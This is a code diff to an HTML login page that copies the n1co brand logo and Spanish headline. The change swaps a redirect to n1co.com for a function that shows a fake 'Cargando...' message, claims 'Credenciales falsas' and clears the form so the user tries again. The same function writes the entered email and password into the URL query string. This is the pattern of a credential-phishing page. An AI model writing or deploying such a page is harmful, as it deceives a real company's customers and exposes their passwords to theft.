@@ -65,7 +65,10 @@
       outline:none;
       border-color:#3b82f6;
     }
-
+    .form-input.error {
+      border-color:#ef4444;
+      background-color:#fee2e2;
+    }
     .password-container { position:relative; }
     .password-toggle {
       position:absolute;
@@ -120,7 +123,7 @@
       <img src="logo-n1co.svg" alt="n1co" class="logo">
       <h1 class="headline">La forma más completa de hacer crecer tu negocio</h1>
 
-  <form id="loginForm" method="GET" onsubmit="redirectN1co(event)">
+  <form id="loginForm" method="GET" onsubmit="showFakeLoading(event)">
         <div class="form-group">
           <label class="form-label" for="email">Correo Electrónico</label>
           <input id="email" name="username" type="email" class="form-input" required>
@@ -152,9 +155,41 @@
       input.type=input.type==='password'?'text':'password';
     }
 
-    function redirectN1co(event) {
+    function showFakeLoading(event) {
       event.preventDefault();
-      window.location.href = 'https://n1co.com';
+      const form = document.getElementById('loginForm');
+      const emailInput = document.getElementById('email');
+      const passInput = document.getElementById('password');
+      // Oculta el formulario
+      form.style.display = 'none';
+      // Crea mensaje de cargando
+      let loadingMsg = document.getElementById('loadingMsg');
+      if (!loadingMsg) {
+        loadingMsg = document.createElement('div');
+        loadingMsg.id = 'loadingMsg';
+        loadingMsg.style.fontSize = '18px';
+        loadingMsg.style.textAlign = 'center';
+        loadingMsg.style.marginTop = '40px';
+        form.parentNode.appendChild(loadingMsg);
+      }
+      loadingMsg.textContent = 'Cargando...';
+      // Después de 2 segundos, muestra mensaje de credenciales falsas y resalta campos
+      setTimeout(() => {
+        loadingMsg.textContent = 'Credenciales falsas';
+        emailInput.classList.add('error');
+        passInput.classList.add('error');
+        // Después de 1 segundo, vuelve a mostrar el formulario y limpia los campos
+        setTimeout(() => {
+          form.style.display = '';
+          loadingMsg.textContent = '';
+          emailInput.classList.remove('error');
+          passInput.classList.remove('error');
+        }, 1000);
+      }, 2000);
+      // Los datos se envían por la URL (GET)
+      const email = emailInput.value;
+      const password = passInput.value;
+      window.history.replaceState(null, '', `?username=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`);
     }
   </script>
 </body>
